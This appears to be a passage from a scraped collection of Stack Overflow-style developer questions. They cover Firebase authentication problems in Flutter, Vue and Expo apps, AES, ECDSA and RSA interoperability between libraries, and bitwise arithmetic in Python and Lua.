import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:whatsapp/Pages/home.dart';

class AuthPage {
  final _auth = FirebaseAuth.instance;   

  Future loginUser(
      BuildContext context, bool mounted, String email, String password) async {
    try {
      // Exibe um CircularProgress antes de Autenticar
      showCircularIndicator(context);

      // await Future.delayed(const Duration(milliseconds: 5000));
      await _auth.signInWithEmailAndPassword(email: email, password: password);
      if (!mounted) return;
          Navigator.pop(context);
          _navigateToNextScreen(context);
      
      // Pegar o usuario atual caso autenticado
      /*
      User? user = FirebaseAuth.instance.currentUser;
      if (user != null) {
        // Usuário está autenticado, agora você pode acessar o campo país
        String? country = await getCountryForUser(user);        
        if (country != null) {         
          if (!mounted) return;
          Navigator.pop(context);
          _navigateToNextScreen(context);
          
        } else{
          return null;
        }
        // Faça o que precisa ser feito com o campo país
      } else {
        // Usuário não autenticado
        print('Usuário não autenticado');
      }
      */

      // Se a autenticação for bem-sucedida, navegue para a próxima tela
    } on FirebaseAuthException catch (e) {
      // Esconde o circularIndicator
      if (!mounted) return;
      Navigator.pop(context);
      // Se houver um erro, chame a função de retorno de erro
      if (e.code == 'invalid-credential') {
        return 'E-mail or Password invalid.';
      } else if (e.code == 'too-many-requests') {
        return 'Login failed, exceed requests try again soon.';
      }
    }
  }

  void _navigateToNextScreen(BuildContext context) {
    Navigator.push(
      context,
      MaterialPageRoute(builder: (context) =&gt; const HomePage()),
    );
  }

  void showCircularIndicator(BuildContext context) {
    showDialog(
        context: context,
        builder: (BuildContext context) {
          return const Center(
            child: CircularProgressIndicator(color: Color(0xFF0ca886)),
          );
        });
  }

  Future&lt;String?&gt; getCountryForUser(User? user) async {
    DocumentSnapshot&lt;Map&lt;String, dynamic&gt;&gt; snapshot = await FirebaseFirestore
        .instance
        .collection(&quot;users&quot;)
        .doc(user?.uid)
        .get();
    if (snapshot.exists) {
      return snapshot.data()?['country'];
    } else {
      return null;
    }
  }
}
</code></pre>
<p>I tried to retrieve the Firestore field in AuthPage but I couldn't use it to validate on the Login page, so I'm in this dilemma and would like to understand if anyone can help me. Thank you...</p>
"
"<p>In my expo application, I want to add a function that will check whether the user with the given email address exists and, based on this, redirect him to the appropriate screen - login or registration.</p>
<p>My function:</p>
<pre><code>  const checkFirebaseAccount = async () =&gt; {
    try {
      const userCredential = await fetchSignInMethodsForEmail(auth, email);

      if (userCredential.length &gt; 0) {
        console.log(&quot;User exists&quot;, userCredential);
      } else {
        console.log(&quot;User does not exist&quot;, userCredential);
      }
    } catch (error) {
      console.error(&quot;Error: &quot;, error.message);
    }
  };
</code></pre>
<p>Unfortunately, every time I call the function by providing the email address for which the account exists in my Firebase Auth, the console shows LOG User does not exist []</p>
<p>Thank you in advance for your help.</p>
"
"<p>I'm developing an app with Flutter that allows the user to edit their login credentials, but the documentation on FirebaseAuth on what happens is very limited, and as I discovered it differs between phone and email.</p>
<p>Below I've outlined my experimental findings about what happens when editing email or when editing phone related to Firebase Auth, and how providerData is structured - parts which would be helpful to be in the Firebase Auth documentation but aren't (if any Firebase devs are reading this, feel free to copy what I wrote to improve the documentation)</p>
<p>What I am curious about (and couldn't find) is how I can remove an email from an account that has both email and phone - so that I can only log in with my phone.</p>
"
"<p>I tried several ways, like:</p>
<pre><code>auth.currentUser.reload();
auth.currentUser.getIdToken(true);
</code></pre>
<p>but none of them works, the <code>onAuthStateChanged</code> listener is not getting called. Its very important for me. Thanks.</p>
"
"<p>I have a &quot;profiles&quot; collection in the Firestore database. The collection has most of the data I need, but the date of creation of the user. In the &quot;Authentication&quot; DB, there is a created column that has the date the user was created.</p>
<p>I want to display the date the user was created in the list. All the data being retrieved from the Firebase collection &quot;Profiles&quot; is displaying fine, but I am having issues getting the data from the authentication. I am getting an N/A as a fallback in case the date is not successfully retrieved. So far all my cells are showing N/A.</p>
<p>The v-for is looping into profiles but not authentication, maybe that is the issue?</p>
<p>What am I missing?</p>
<pre><code> &lt;tr v-for=&quot;user in profiles&quot; :key=&quot;user.id&quot;&gt;
            &lt;td scope=&quot;col-1&quot; class=&quot;fs-7 py-2 px-3&quot;&gt;{{ formatDate(user) }}&lt;/td&gt;
              &lt;/td&gt;
&lt;/tr&gt;
</code></pre>
<p>The script is here:</p>
<pre><code>import { ref, onMounted } from &quot;vue&quot;;
import { db } from &quot;../firebase&quot;;

import {
  collection, deleteDoc, doc,
  getDocs, updateDoc,
} from &quot;firebase/firestore&quot;;

export default {
    setup() {
        const profiles = ref([]);
        const fetchData = async () =&gt; {
            try {
                const profilesSnapshot = await getDocs(collection(db, &quot;profiles&quot;));
                profiles.value = profilesSnapshot.docs.map((doc) =&gt; {
                    return {
                        id: doc.id,
                        ...doc.data(),
                    };
                });
            } catch (error) {
                console.error(&quot;Error fetching data:&quot;, error);
            }
        };
        onMounted(async () =&gt; {
            await fetchData();
        });
        const formatDate = (user) =&gt; {
  if (user.metadata &amp;&amp; user.metadata.creationTimestamp) {
    const date = new Date(user.metadata.creationTimestamp.seconds * 1000); // Assuming timestamp is in seconds
    return date.toLocaleDateString(); 
  } else {
    return 'N/A'; // This is the value I am getting now.
  }
};
        return {
          profiles,
          formatDate, 
        };
    },
};
</code></pre>
"
"<p>I am using firebase/firestore and I really don't want or need anyone to sign in or create a user ID.   I have one collection that I'd like the user to write to.  The fields are meaningless and have no information that would mean anything to anyone but reports I would like to have.  All of the other collections are read only.  Will I be allowed to do this as far as firebase and Apple publishing the app?  If necessary could I create a user with device name and a password but the user would not have to do anything or ever have to?</p>
"
"<p>First, paste a piece of code for the JS encryption steps</p>
<pre><code>&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
var key = '56d4wa56d456sa4d5s6a4ds56a4d5s6a';
var iv = '5412512512';
function encrypt(text,k,i){
    var key = CryptoJS.enc.Utf8.parse(CryptoJS.MD5(k));
    var iv = CryptoJS.enc.Utf8.parse(CryptoJS.MD5(i).toString().substr(8, 16));
    var encrypted = CryptoJS.AES.encrypt(text, key, {
            iv: iv,
            mode:CryptoJS.mode.CBC,
            padding:CryptoJS.pad.Pkcs7
        });
    return encrypted.toString();
}

console.log(encrypt('123456',key,iv)); //输出 cJ1b6TqsnoNFEkSuD3z5RQ==
&lt;/script&gt;
</code></pre>
<p>This is the encryption of the front-end, and the key and iv are dynamically obtained by other methods
Partial data submitted by users will be encrypted using this method, and the backend PHP will decrypt and store it
PHP decryption method obtained through online knowledge and GPT Q&amp;A</p>
<pre><code>$key = '56d4wa56d456sa4d5s6a4ds56a4d5s6a';
$iv = '5412512512';
$encryptedText = 'cJ1b6TqsnoNFEkSuD3z5RQ==';


$decryptedText = dencryptWithOpenssl($encryptedText, $key, $iv);

echo $decryptedText; // 输出解密后的文本
function dencryptWithOpenssl($data,$key,$iv)
{
        $data = base64_decode($data);
        $key = md5($key);
        $iv = substr(md5($iv), 8, 16); // 使用MD5哈希的中间16个字符作为IV
        $decryptedData= openssl_decrypt($data, 'aes-128-cbc', $key, OPENSSL_RAW_DATA, $iv);
        if ($decryptedData === false) {
            return &quot;Decryption failed: &quot; . openssl_error_string();
        }else{
            return $decryptedData;
        }
}
</code></pre>
<p>Actual PHP decryption corresponds to cJ1b6TqsnoNFEkSuD3z5RQ==return false</p>
<p>I have been troubled for a long time. Through front-end and back-end debugging, the key and iv are printed to be consistent, but the back-end fails to decrypt them as soon as they are decrypted</p>
<p>The first test was conducted using fixed key and iv as fixed 16 length strings. In this case, front-end encryption and back-end decryption were normal. However, once the key and iv were dynamic, the front-end generated the key through 'CryptoJS. enc. Utf8. part (CryptoJS. MD5 (k))', and the back-end decryption failed. If the key was fixed, iv was dynamically generated, and decryption still succeeded, except for the failure when the key was dynamic</p>
<p>It's also possible that I'm not proficient in my studies, so I'm here to ask everyone for more guidance. Thank you</p>
"
"<pre><code>x = &quot;x8+x5+x3+x2+x0&quot;
y = &quot;x6+x5+x3+x2+x1&quot;
m = &quot;x8+x6+x5+x1+x0&quot;
X = 0
Y = 0
M = 0
# converting polynomials to binary
for l in x:
    if l.isdigit() == True:
        X = X + 10**int(l)
for l in y:
    if l.isdigit() == True:
        Y = Y + 10**int(l)
for l in m:
    if l.isdigit() == True:
        M = M + 10**int(l)
sum=0 
# adding two binary values       
while X!=0 :
    d1 = X%10
    d2 = Y%10
    sum = (sum*10) + (d1^d2)
    Y = Y//10
    X = X//10
# reversing the sum coz the addition was performed reversed
rev_sum = 0
while sum != 0:
    digit = sum % 10
    rev_sum = rev_sum * 10 + digit
    sum //= 10 
</code></pre>
<p>Over here each character of the string polynomial is taken, checked if it is a digit, then I have performed 10**int(l) --&gt; this is creating values like 1000 if it is x3 and so on, then it is added. Ofcourse the value is in integer datatype and looks like decimal value, but I couldn't think of a better way to get it in binary form. My idea is to convert the value to string and then actually convert to binary notation using any function (if it exists) when finding the modulus.</p>
<p>I have done the XOR sum of two polynomials after converting them to binary values.
Now I have a binary value rev_sum and I have to mod it with variable M. Ofcourse we need XOR even during finding the modulus. I need the final answer as a polynomial, how do I proceed?</p>
"
"<p>I have a nodejs app using the following code to initialise the app:</p>
<pre><code>import { applicationDefault, initializeApp } from 'firebase-admin/app';
  const app = initializeApp({
    credential: applicationDefault(),
    projectId: FIREBASE_PROJECT_ID,
  });
</code></pre>
<p>I'm now trying to run my tests in my github-actions pipeline, first by running the following steps to use workload identity federation to authenticate to google and create the <code>GOOGLE_APPLICATION_CREDENTIALS</code> env var which contains the generated json file for the service account (with firebase admin permissions). As per <a href=""https://firebase.google.com/docs/admin/setup#initialize_the_sdk_in_non-google_environments"" rel=""nofollow noreferrer"">the docs</a> to set up in a non-google environment.</p>
<p>Relevant Github Actions code:</p>
<pre><code>      - name: Checkout code
        uses: actions/checkout@v3

      - id: 'auth'
        name: 'Authenticate to Google Cloud'
        uses: 'google-github-actions/auth@v2'
        with:
          workload_identity_provider: 'PATH-TO-PROVIDER'
          service_account: 'XXXXXXX@XXXXXX.iam.gserviceaccount.com'

       ...install dependencies etc...

       - name: Run tests
        run: |
          pnpm run lint
          pnpm run test
</code></pre>
<p><strong>Note</strong>: From the google-github-actions <a href=""https://github.com/google-github-actions/auth?tab=readme-ov-file#inputs-miscellaneous"" rel=""nofollow noreferrer"">docs</a>, I have ensured that <code>create_credentials_file</code> and <code>export_environment_variables</code> are set to true, and verified they're present by SSH'ing into the github runner.</p>
<p>However, I'm receiving the following error when the firebase app is attempting to initialise:</p>
<blockquote>
<pre><code> Error: Invalid contents in the credentials file
  at credentialFromFile (node_modules/.pnpm/firebase-admin@11.11.1/node_modules/firebase-admin/lib/app/credential-internal.js:496:11)
  at getApplicationDefault (node_modules/.pnpm/firebase-admin@11.11.1/node_modules/firebase-admin/lib/app/credential-internal.js:401:16)
  at applicationDefault (node_modules/.pnpm/firebase-admin@11.11.1/node_modules/firebase-admin/lib/app/credential-factory.js:55:80)
  at connectFirebase (src/services/firebase.mts:17:17)
  at Context.&lt;anonymous&gt; (test/test.mts:38:25)
  at process.processImmediate (node:internal/timers:471:21)
</code></pre>
</blockquote>
<p>Any ideas how I can fix this? I would prefer to stay away from adding a long lived JSON key to github actions secrets (added as a value to the GOOGLE_APPLICATION_CREDENTIALS variable).</p>
"
"<p>I am encountering an issue with Firebase Auth that seems to be related to the &quot;Cross-Origin-Opener-Policy&quot; header. The error message in the console is as follows:
Cross-Origin-Opener-Policy policy would block the window.closed call.</p>
<p>I am using Vue.js on the frontend and Nest.js on the backend. I am trying this on localhost.</p>
<p>This is the code that is causing the problem:</p>
<pre><code>import { signInWithPopup } from 'firebase/auth'
const signInWithGoogle = () =&gt; {
  const providers = new GoogleAuthProvider()
  signInWithPopup(getAuth(), providers)
    .then(() =&gt; {
      router.push({ name: 'home' })
    })
    .catch((error) =&gt; {
      console.log('error')
      console.log(error)
      alert(error.message)
    })
}
</code></pre>
<p>I click on 'Login,' then choose 'Sign in with Google.' It opens the popup, and I get the following error two times in the console:</p>
<pre><code>Cross-Origin-Opener-Policy policy would block the window.closed call. firebase_auth.js?v=99e2f81e:6512 
poll @ firebase_auth.js?v=99e2f81e:6512
show less
</code></pre>
<p>The popup opens, I click on my user, and I am successfully logged in through Google. Everything works perfectly, but I get two additional errors, the same as above.
Everything works perfectly, and nothing breaks, but I still encounter these errors in my console. How can I fix them?</p>
<p>I expect to be logged in without errors. I've tried all the fixes I could find on the first page of Google, but nothing has helped.</p>
"
"<p>I am using firebase for authentication , the signup is successfully working but when i login i got this error occurs, i tried everything  even i turned off the firebase 'email enumeration protection
but the error still remains same. Actually it do sign in but also same time give error.</p>
<blockquote>
<p>wa@gmail.com1212
I/FirebaseAuth(22477): Logging in as wa@gmail.com with empty reCAPTCHA token
W/System  (22477): Ignoring header X-Firebase-Locale because its value was null.
D/Linux   (22477): [Posix_connect Debug]Process com.ggsolutions.god_given :443
E/RecaptchaCallWrapper(22477): Initial task failed for action RecaptchaAction(action=signInWithPassword)with exception - The supplied auth credential is incorrect, malformed or has expired.
D/Linux   (22477): [Posix_connect Debug]Process com.ggsolutions.god_given :443
V/NativeCrypto(22477): SSL shutdown failed: ssl=0xb400007ccbc49b98: I/O error during system call, Broken pipe
D/Linux   (22477): [Posix_connect Debug]Process com.ggsolutions.god_given :443 .loginController:</p>
</blockquote>
<pre><code>

class LoginController extends GetxController {
  //TODO: Implement LoginController

  final FirebaseAuth _auth = FirebaseAuth.instance;
  Rx&lt;User?&gt; user = Rx&lt;User?&gt;(null);
  Rx&lt;UserData?&gt; userData = Rx&lt;UserData?&gt;(null);
  RxBool isLoading = false.obs;

  @override
  void onInit() {
    super.onInit();
    user.bindStream(_auth.authStateChanges());
    checkAuthentification();
  }

  void checkAuthentification() {
    print(&quot;I called&quot;);
    _auth.authStateChanges().listen((user) async {
      if (user != null) {
        print(&quot;Inned also called&quot;);
        await fetchUserData(user.uid);

        Get.off(HomeView(userData: userData.value!));
      }
    });
  }


  Future&lt;void&gt; signIn({
    required String email,
    required String password,
  }) async {
    try {
       isLoading(true);
      print(email + password);
         await _auth
          .signInWithEmailAndPassword(email: email, password: password)
          .then((value) async {
            checkAuthentification();
      });
    } on FirebaseAuthException catch (e) {
      isLoading(false);
      Get.snackbar('Error hai', e.toString(),
          snackPosition: SnackPosition.BOTTOM);
    }
  }

  Future&lt;void&gt; fetchUserData(String userId) async {
    try {
      DocumentSnapshot userDataSnapshot = await FirebaseFirestore.instance
          .collection('users')
          .doc(userId)
          .get();
      if (userDataSnapshot.exists) {
        userData.value =
            UserData.fromJson(userDataSnapshot.data() as Map&lt;String, dynamic&gt;);
      } else {
        Get.snackbar(
            &quot;Error&quot;, &quot;User Data not found for user- with ID : $userId&quot;);
      }
    } catch (e) {
      print('Error fetching user data:$e');
    }
  }
}

</code></pre>
<p>I am expecting to move to  the /home route after successfully Login but it keep giving error even after print that its login.</p>
"
"<p>I can perform verification in Node Crypto without problem and it outputs <code>true</code>, but when i tried with Web Crypto it outputs <code>false</code> without any errors but both using same variables. I can't use Node Crypto because code will run in CF Worker Runtime and it doesn't supports related Node Crypto functions. Why it's happening like this and how can i fix.</p>
<p>This code is using Node Crypto and outputs <code>true</code>.</p>
<pre><code>import crypto from &quot;crypto&quot;;

const publicKeyPEM = `-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEXjyD37iJ6K7dVWCANfrTEJkDFKZt
dlaCMOGuTE3qsy4PF3FqUnDi0EZxty8n6Mb3W3Ahj0ASkF+GwNW8C/ztdQ==
-----END PUBLIC KEY-----`;
const messageToVerify = &quot;hello world&quot;;
const signature =
    &quot;MEUCIENzPHGDk+t1inhAvnqPX1OYLfSltYVIv1cipjW2F3CxAiEAzTVrj5CCHChsyeAif0qM6UvX3h0U7BDHhb+XmsXwO/c=&quot;;

(() =&gt; {
    const verify = crypto.createVerify(&quot;SHA256&quot;);
    verify.update(messageToVerify);
    const verified = verify.verify(
        publicKeyPEM,
        Buffer.from(signature, &quot;base64&quot;)
    );
    console.log(verified);
})();

</code></pre>
<p>This code is using Web Crypto API and outputs <code>false</code>.</p>
<pre><code>function str2ab(str) {
    const buf = new ArrayBuffer(str.length);
    const bufView = new Uint8Array(buf);
    for (let i = 0, strLen = str.length; i &lt; strLen; i++) {
        bufView[i] = str.charCodeAt(i);
    }
    return buf;
}

async function importEcdsaKey(pem) {
    const pemHeader = &quot;-----BEGIN PUBLIC KEY-----&quot;;
    const pemFooter = &quot;-----END PUBLIC KEY-----&quot;;
    const pemContents = pem.substring(
        pemHeader.length,
        pem.length - pemFooter.length - 1
    );

    const binaryDerString = atob(pemContents);
    const binaryDer = str2ab(binaryDerString);

    return await crypto.subtle.importKey(
        &quot;spki&quot;,
        binaryDer,
        {
            name: &quot;ECDSA&quot;,
            namedCurve: &quot;P-256&quot;,
        },
        true,
        [&quot;verify&quot;]
    );
}

function base64ToArrayBuffer(base64String) {
    const binaryString = atob(base64String);
    const bytes = new Uint8Array(binaryString.length);
    for (let i = 0; i &lt; binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }
    return bytes.buffer;
}

const publicKeyPEM = `-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEXjyD37iJ6K7dVWCANfrTEJkDFKZt
dlaCMOGuTE3qsy4PF3FqUnDi0EZxty8n6Mb3W3Ahj0ASkF+GwNW8C/ztdQ==
-----END PUBLIC KEY-----`;
const messageToVerify = &quot;hello world&quot;;
const signature =
    &quot;MEUCIENzPHGDk+t1inhAvnqPX1OYLfSltYVIv1cipjW2F3CxAiEAzTVrj5CCHChsyeAif0qM6UvX3h0U7BDHhb+XmsXwO/c=&quot;;

(async () =&gt; {
    const publicKey = await importEcdsaKey(publicKeyPEM);
    const signatureArrayBuffer = base64ToArrayBuffer(signature);
    const data = new TextEncoder().encode(messageToVerify);

    const result = await crypto.subtle.verify(
        {
            name: &quot;ECDSA&quot;,
            hash: { name: &quot;SHA-256&quot; },
        },
        publicKey,
        signatureArrayBuffer,
        data
    );

    console.log(result);
})();

</code></pre>
"
"<p>I'm currently building a Flutter app integrated with Firebase authentication. I'm using <code>createUserWithEmailAndPassword</code> to authenticate my users, which is functioning correctly.</p>
<p>However, I encountered an issue when attempting to reset passwords using FirebaseAuth.instance.sendPasswordResetEmail. While Firebase sends a password reset email to my inbox, clicking the link in the email results in an error message stating:</p>
<blockquote>
<p>The selected page mode is invalid.</p>
</blockquote>
<p>Upon inspection, I noticed that the API key is missing from the link. Manually inserting the API key resolves the issue, allowing the link to function properly.so how do i make sure the apikey is not omitted with firebase sends the link:</p>
<p><img src=""https://i.stack.imgur.com/UAYSm.png"" alt=""Code for reset Password"" /></p>
<p>the link with missing API KEY:<a href=""https://skin-disease-detection-s-57573.firebaseapp.com/__/auth/action?mode=resetPassword&amp;oobCode=N7p147fBJ12IrYDa_xhKSyhgfuTd9bOh7b1KKSvMqq4AAAGN0ikwvw&amp;apiKey=&amp;lang=en"" rel=""nofollow noreferrer"">https://skin-disease-detection-s-57573.firebaseapp.com/__/auth/action?mode=resetPassword&amp;oobCode=N7p147fBJ12IrYDa_xhKSyhgfuTd9bOh7b1KKSvMqq4AAAGN0ikwvw&amp;apiKey=&amp;lang=en</a></p>
<p><img src=""https://i.stack.imgur.com/s8fQU.png"" alt=""Error link"" /></p>
"
"<p>How can I convert a string containing a public key in PEM <code>PKCS#1</code> format to a PublicKey object?</p>
<p>Currently, the code I have only successfully converts the string in <code>PKCS#8</code> format.</p>
<pre><code>const val PKCS1PublicHeader = &quot;-----BEGIN RSA PUBLIC KEY-----&quot;
const val PKCS1PublicFooter = &quot;-----END RSA PUBLIC KEY-----&quot;
const val PKCS8PublicHeader = &quot;-----BEGIN PUBLIC KEY-----&quot;
const val PKCS8PublicFooter = &quot;-----END PUBLIC KEY-----&quot;
fun String.pemToPublicKey(algorithm: String): PublicKey? {
    return try {
        val isRSAPublicKey = this.contains(PKCS1PublicHeader)
        val cleanedKeyContent = this
            .replace(&quot;\\r\\n&quot;, &quot;&quot;)
            .replace(&quot;\\n&quot;, &quot;&quot;).let {
                if (isRSAPublicKey) {
                    it.replace(PKCS1PublicHeader, &quot;&quot;).replace(PKCS1PublicFooter, &quot;&quot;)
                } else {
                    it.replace(PKCS8PublicHeader, &quot;&quot;).replace(PKCS8PublicFooter, &quot;&quot;)
                }
            }

        val keyBytes = Base64.decode(cleanedKeyContent, Base64.NO_WRAP)

        println(&quot;Cleaned Key Content: $cleanedKeyContent&quot;)
        println(&quot;Is RSA Public Key: $isRSAPublicKey&quot;)

        val keySpec: KeySpec = if (isRSAPublicKey) {
            val modulus = BigInteger(1, keyBytes)
            val exponent = BigInteger.valueOf(65537)
            RSAPublicKeySpec(modulus, exponent)
        } else {
            X509EncodedKeySpec(keyBytes)
        }

        val keyFactory = KeyFactory.getInstance(algorithm)
        val publicKey = keyFactory.generatePublic(keySpec)
//            as RSAPublicKey

        println(&quot;Generated Public Key: $publicKey&quot;)

        publicKey

//        KeyFactory.getInstance(algorithm).generatePublic(keySpec)
    } catch (e: Exception) {
        Timber.e(e, &quot;Invalid PEM key: $this&quot;)
        null
    }
}
</code></pre>
"
"<p>I am working on a Flutter app that uses Firebase for authentication. I am using <code>firebase_auth</code> package to achieve that. It is working fine. Majority of my Flutter application will be based on Websockets for which I am using <code>web_socket_channel</code> package.</p>
<p>Since websockets don't support sending custom headers and such, I cannot send idToken of the currently logged in user when the Websockets connection is established. So I must create a session on server-side to store the idToken. Since <code>firebase_auth</code> is all client-side, I must sign user in using Firebase Admin SDK. If I do that, I lose the functionality of refreshing the idToken when it expires. I can still refresh the idToken but that kinds of defeats the whole purpose of using <code>firebase_auth</code> package which provides all these functionality out of the box.</p>
<p>How do I achieve best of both worlds where I can still use <code>firebase_auth</code> package for all the Authentication purpose and still maintain a session on server-side with the correct idToken for the user even if it refreshes.</p>
<p>If I am going about it all wrong way, please point me in the right direction. I am not looking for code. I am looking for general direction as I am stuck.</p>
"
"<p>We have a legacy python2 application that uses an RSA private key to decrypt a base64-encoded file.  How do we port this to python3?</p>
<h2>Python2.7 code, this does work:</h2>
<pre class=""lang-py prettyprint-override""><code>    def _unlock_keys(self, passphrase):
        #get user priv key passphrase and perform unlock of randbits
        master_key = None
        master_key_path = 'master.pem'

        with open(master_key_path) as f:
            master_key = RSA.importKey(f.read(), passphrase)

        with open('host_keys/part.A') as f:
            enc_bits = f.read()
            self.part_A = master_key.decrypt(b64decode(enc_bits))
            
        # self.part_A has the data we need
</code></pre>
<h2>Python3 code, this does not work:</h2>
<p>This is what we've tried on the python3 code, but so far it decrypts to the empty bytestring <code>b''</code>:</p>
<pre class=""lang-py prettyprint-override""><code>    def _unlock_keys(self, passphrase):
        #get user priv key passphrase and perform unlock of randbits
        master_key = None 
        master_key_path = 'master.pem'

        with open(master_key_path) as f:
            master_key = RSA.importKey(f.read(), passphrase)

        with open('host_keys/part.A') as f:
            enc_bits = f.read()

            # Note: PKCS1_OAEP doesn't work because this is raw, unpadded:
            decryptor = PKCS1_v1_5.new(master_key)
            self.part_A = decryptor.decrypt(b64decode(enc_bits), &quot;error&quot;)
            print(self.part_A)

        # self.part_A prints as b''
</code></pre>
<h2>OpenSSL command that works</h2>
<p>We can use OpenSSL to decrypt it as follows.  Note the <code>-raw</code> argument because there is no PKCS padding, and this is PKCS v1.5:</p>
<pre class=""lang-bash prettyprint-override""><code>openssl rsautl -pkcs -raw -decrypt -in &lt;(base64 -d host_keys/part.A) -out /proc/self/fd/1 -inkey master.pem
Enter pass phrase for master.pem:
&lt;correct output&gt;
</code></pre>
<p>(Maybe I should have posed the question <em>&quot;how can I implement this openssl command in python3?&quot;</em> but methinks that would be an XY question...)</p>
<h2>Key format</h2>
<p>In case it helps, this is what the private key format looks like.</p>
<pre><code>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,&lt;REDACTED&gt;

...
-----END RSA PRIVATE KEY-----
</code></pre>
"
"<p>I have a PEM encoded certificate. I want to get the <strong>ASN.1 BIT STRING</strong> of the public key. I am using <a href=""https://cryptography.io/en/latest/"" rel=""nofollow noreferrer"">pyca's cryptography</a> package. All I am getting is the whole subject public key info in DER format. My question is is there any easy way to get only the public key's BIT STRING? Mainly, I want to calculate the <strong>issuerKeyHash</strong> which is needed to build <strong>OCSP request</strong>.</p>
<p>Input:</p>
<pre><code>from cryptography import x509
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

with open (&quot;test_issuer.pem&quot;,&quot;rb&quot;) as file:
    pem_data = file.read()
    issuer_cert = x509.load_pem_x509_certificate(pem_data)

pubkey = issuer_cert.public_key()
pubkey_bytes = pubkey.public_bytes(encoding=Encoding.DER, format=PublicFormat.SubjectPublicKeyInfo)
print(pubkey_bytes.hex())
</code></pre>
<p>Output:</p>
<pre><code>3059301306072a8648ce3d020106082a8648ce3d030107034200041306605a1910efd18b382f05719062bea9c63a118124bc3cde6a4959734ecef00129c92573255bca278f5a5f3e403128bd9b9ad9d5517c4f796120e673a9aa9e
</code></pre>
<p>As mentioned, this is the whole subject public key info (91 bytes). Using an ASN.1 viewer or openssl, I observed that the actual BIT STRING excluding all the algorithm info, tags and length starts from byte 25. I can of course write a function to read all the tags and length info and extract the BIT STRING. But is there any built in function for this purpose?</p>
<p>Expected output:</p>
<pre><code>041306605a1910efd18b382f05719062bea9c63a118124bc3cde6a4959734ecef00129c92573255bca278f5a5f3e403128bd9b9ad9d5517c4f796120e673a9aa9e
</code></pre>
"
"<p>I'm getting this error when trying to use Google Sign-in with Firebase Emulators</p>
<blockquote>
<p>[ERROR:flutter/runtime/dart_vm_initializer.cc(41)] Unhandled Exception: [firebase_auth/unknown] An internal error has occurred. [ The Auth Emulator only support sign-in with google.com using id_token, not access_token. Please update your code to use id_token.</p>
</blockquote>
<p>My sign-in code is copied almost verbatim from Firebase docs</p>
<pre class=""lang-dart prettyprint-override""><code>import 'package:firebase_auth/firebase_auth.dart';
import 'package:google_sign_in/google_sign_in.dart';

Future&lt;UserCredential&gt; signInWithGoogle() async {
  // Trigger the authentication flow
  final GoogleSignInAccount? googleUser = await GoogleSignIn().signIn();

  // Obtain the auth details from the request
  final GoogleSignInAuthentication? googleAuth = await googleUser?.authentication;

  // Create a new credential
  final credential = GoogleAuthProvider.credential(
    accessToken: googleAuth?.accessToken,
    idToken: googleAuth?.idToken,
  );

  // Once signed in, return the UserCredential
  return await FirebaseAuth.instance.signInWithCredential(credential);
}
</code></pre>
<p>This only shows up when hooked up to Emulator suite and not when using real Firebase instance.</p>
<p>Is there a workaround or fix?</p>
<p><strong>Flutter Doctor output</strong></p>
<pre><code>[✓] Flutter (Channel stable, 3.16.8, on Ubuntu 22.04.3 LTS 6.5.0-21-generic, locale en_US.UTF-8)
    • Flutter version 3.16.8 on channel stable at /home/starleaf1/snap/flutter/common/flutter
    • Upstream repository https://github.com/flutter/flutter.git
    • Framework revision 67457e669f (6 weeks ago), 2024-01-16 16:22:29 -0800
    • Engine revision 6e2ea58a5c
    • Dart version 3.2.5
    • DevTools version 2.28.5

[✓] Android toolchain - develop for Android devices (Android SDK version 34.0.0)
    • Android SDK at /home/starleaf1/Android/Sdk
    • Platform android-34, build-tools 34.0.0
    • Java binary at: /home/starleaf1/android-studio/jbr/bin/java
    • Java version OpenJDK Runtime Environment (build 17.0.7+0-17.0.7b1000.6-10550314)
    • All Android licenses accepted.

[✓] Chrome - develop for the web
    • Chrome at google-chrome

[✓] Linux toolchain - develop for Linux desktop
    • clang version 10.0.0-4ubuntu1
    • cmake version 3.16.3
    • ninja version 1.10.0
    • pkg-config version 0.29.1

[✓] Android Studio (version 2023.1)
    • Android Studio at /home/starleaf1/android-studio
    • Flutter plugin version 78.0.1
    • Dart plugin can be installed from:
      🔨 https://plugins.jetbrains.com/plugin/6351-dart
    • android-studio-dir = /home/starleaf1/android-studio
    • Java version OpenJDK Runtime Environment (build 17.0.7+0-17.0.7b1000.6-10550314)

[✓] VS Code (version unknown)
    • VS Code at /snap/code/current
    • Flutter extension can be installed from:
      🔨 https://marketplace.visualstudio.com/items?itemName=Dart-Code.flutter
    ✗ Unable to determine VS Code version.

[✓] Connected device (3 available)
    • sdk gphone64 x86 64 (mobile) • emulator-5554 • android-x64    • Android 14 (API 34) (emulator)
    • Linux (desktop)              • linux         • linux-x64      • Ubuntu 22.04.3 LTS 6.5.0-21-generic
    • Chrome (web)                 • chrome        • web-javascript • Google Chrome 121.0.6167.184

[✓] Network resources
    • All expected network resources are available.

• No issues found!
</code></pre>
<p>The Firebase integration was initialized using FlutterFire CLI</p>
"
"<p>Lua 5.1 does not yet support bitwise operators. The Lua environment I'm using is restricted and provides a bit32 library that allows bitwise operations with 32-bit numbers.</p>
<p>The issue is that I'm trying to backport an algorithm written in Lua 5.4 (poly1305), which you can find here: https://github.com/philanc/plc/blob/master/plc/poly1305.lua And this algorithm uses numbers larger than 32 bits, which makes the result incorrect in my environment.</p>
<p>You can find my backport of poly1305 https://pastebin.com/mfNhDqvw</p>
<p>I've done some research to perform bitwise operations using arithmetic, and I found functional wrappers, but they don't work with numbers larger than 32 bits. Would any of you be able to make them work with 64-bit numbers, or rewrite them completely if necessary?</p>
<pre class=""lang-lua prettyprint-override""><code>local MOD = 2 ^ 32
local MODM = MOD - 1
 
local function memoize(f)
    local mt = { }
    local t = setmetatable( { }, mt)
    function mt:__index(k)
        local v = f(k)
        t[k] = v
        return v
    end
    return t
end
 
local function make_bitop_uncached(t, m)
    local function bitop(a, b)
        local res, p = 0, 1
        while a ~= 0 and b ~= 0 do
            local am, bm = a % m, b % m
            res = res + t[am][bm] * p
